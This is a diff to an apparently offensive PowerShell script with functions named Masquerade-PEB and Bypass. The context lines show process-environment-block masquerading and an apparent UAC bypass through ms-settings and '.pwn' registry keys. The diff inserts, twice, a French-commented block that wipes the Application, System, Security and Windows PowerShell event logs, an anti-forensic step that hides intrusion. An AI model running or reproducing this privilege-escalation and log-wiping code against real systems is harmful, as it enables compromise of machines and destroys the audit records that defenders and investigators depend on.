@@ -254,6 +254,19 @@ function Masquerade-PEB {
     } else {
         [Ntdll]::RtlLeaveCriticalSection($PEBFlags.FastPebLock64)
     } echo "[!] RtlLeaveCriticalSection --> &Peb->FastPebLock`n"
+# Liste des journaux que vous souhaitez effacer
+$logsToClear = @("Application", "System", "Security", "Windows Powershell")  # Ajoutez ou supprimez les noms des journaux ici
+
+# Parcourir chaque journal et le vider s'il existe
+foreach ($logName in $logsToClear) {
+    $eventLog = Get-WmiObject -Class Win32_NTEventlogFile | Where-Object { $_.LogfileName -eq $logName }
+    if ($eventLog) {
+        Write-Host "Effacement du journal : $logName"
+        $eventLog.ClearEventLog()
+    } else {
+        Write-Host "Le journal '$logName' n'existe pas ou n'est pas accessible."
+    }
+}
 }
 
 function Bypass {
@@ -300,6 +313,19 @@ function Bypass {
         Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
         Remove-Item -Path "HKCU:\Software\Classes\.pwn\" -Recurse -Force -ErrorAction SilentlyContinue
     }
+# Liste des journaux que vous souhaitez effacer
+$logsToClear = @("Application", "System", "Security", "Windows Powershell")  # Ajoutez ou supprimez les noms des journaux ici
+
+# Parcourir chaque journal et le vider s'il existe
+foreach ($logName in $logsToClear) {
+    $eventLog = Get-WmiObject -Class Win32_NTEventlogFile | Where-Object { $_.LogfileName -eq $logName }
+    if ($eventLog) {
+        Write-Host "Effacement du journal : $logName"
+        $eventLog.ClearEventLog()
+    } else {
+        Write-Host "Le journal '$logName' n'existe pas ou n'est pas accessible."
+    }
+}
 }
 
 # Exécute la fonction
